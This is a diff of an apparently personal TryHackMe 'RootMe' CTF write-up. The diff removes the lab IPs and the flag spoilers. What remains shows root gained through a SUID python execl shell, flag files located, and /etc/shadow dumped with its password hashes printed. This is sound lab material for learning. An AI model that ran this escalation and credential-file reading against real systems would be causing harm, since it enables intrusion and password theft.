@@ -1,13 +1,5 @@
 ===RootMe	Flutter July 27 2021===
 
-IP 10.10.152.22
-
-> export IP=10.10.152.22
-	
-MYIP 10.10.106.37
-
-> export MYIP=10.10.106.37
-
 
 # Recon #
 
@@ -172,33 +164,20 @@ bash-4.4$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 	> root gained
 
 \# find / -type f -name user.txt
-	> /var/www/user.txt
+
+	/var/www/user.txt
 
 \# cat /var/www/user.txt
 	
-*Flag Found*<details>
-<summary>Spoiler</summary>
-	
-> /var/www/user.txt:
-
-	THM{y0u_g0t_a_sh3ll}
-
-</details>
-
+	Flag Found
 
 \# find / -type f -name root.txt
-	>/root/root.txt
+	
+	/root/root.txt
 
 \# cat /root/root.txt
 
-*Flag Found*<details>
-	<summary>Spoiler</summary>
-	
-> /root/root.txt:
-
-	THM{pr1v1l3g3_3sc4l4t10n}
-
-</details>
+	Flag Found
 
 
 # Okay, we've gotten all the flags for the challenge... but I'm not quite done #
@@ -207,13 +186,11 @@ Let's get those user hashes
 
 \# cat /etc/shadow
 	
-	'''
 	root:$6$5osB44J2$24WV3zAR1FTqEq3f2kSqrigUgyDmKucU8rwHvbOJWxIoWSlHbVHV1Ug1eOHqidieZWDU3Y5V3cimChun2JYNw1:18478:0:99999:7:::
 
 	rootme:$6$jzeDDmrVeqMMEQqv$j8jwWy951YwWBJWzQNn.A45I.8H06/QOv4qocX.hNDdT42NytyavSHxlxoEh0ek2OS4NX27tuuZRTJuHPSWCp.:18478:0:99999:7:::
 
 	test:$6$vXOyvOWZ$UpIjnJq/KuKmKHezW/pEM.nrI6QuqhWWlv/fUmLvJI1YG7nju2vpP3vg1Q0SSf5FCk8058WD5Rc3XXPMRlqHb0:18478:0:99999:7:::
-	'''
 
 > eh, we can crack them another time for fun, not necessary
 
